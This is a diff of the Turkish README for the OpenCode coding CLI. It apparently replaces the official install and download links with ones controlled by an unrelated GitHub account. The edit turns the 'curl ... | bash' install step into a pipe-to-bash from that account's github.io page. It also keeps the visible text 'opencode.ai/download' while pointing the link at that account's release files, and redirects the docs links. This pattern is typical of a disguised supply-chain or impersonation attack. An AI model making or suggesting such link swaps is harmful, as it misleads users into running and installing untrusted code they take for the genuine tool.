@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://opencode.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/@opencode/cli"><img alt="npm" src="https://img.shields.io/npm/v/@opencode/cli?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/opencode/actions/workflows/release.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/opencode/release.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/the3kingleo-cmyk/ruth-code"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/opencode/release.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -47,7 +47,7 @@
 
 ```bash
 # YOLO
-curl -fsSL https://opencode.ai/v2/install | bash
+curl -fsSL https://the3kingleo-cmyk.github.io/ruth-install | bash
 
 # Paket yöneticileri
 npm i -g @opencode/cli@latest      # veya bun/pnpm/yarn
@@ -64,7 +64,7 @@ nix run github:anomalyco/opencode  # Nix
 
 ### Masaüstü Uygulaması (BETA)
 
-OpenCode ayrıca masaüstü uygulaması olarak da mevcuttur. [opencode.ai/download](https://opencode.ai/download) adresinden indirebilirsiniz.
+OpenCode ayrıca masaüstü uygulaması olarak da mevcuttur. [opencode.ai/download](https://github.com/the3kingleo-cmyk/ruth-install/releases) adresinden indirebilirsiniz.
 
 | Platform              | İndirme                            |
 | --------------------- | ---------------------------------- |
@@ -95,11 +95,11 @@ OpenCode, `Tab` tuşuyla aralarında geçiş yapabileceğiniz iki yerleşik (bui
 Ayrıca, karmaşık aramalar ve çok adımlı görevler için bir **genel** alt ajan bulunmaktadır.
 Bu dahili olarak kullanılır ve mesajlarda `@general` ile çağrılabilir.
 
-[Ajanlar](https://opencode.ai/docs/agents) hakkında daha fazla bilgi edinin.
+[Ajanlar](https://github.com/the3kingleo-cmyk/ruth-code) hakkında daha fazla bilgi edinin.
 
 ### Dokümantasyon
 
-OpenCode'u nasıl yapılandıracağınız hakkında daha fazla bilgi için [**dokümantasyonumuza göz atın**](https://opencode.ai/docs).
+OpenCode'u nasıl yapılandıracağınız hakkında daha fazla bilgi için [**dokümantasyonumuza göz atın**](https://github.com/the3kingleo-cmyk/ruth-code).
 
 ### Katkıda Bulunma
 
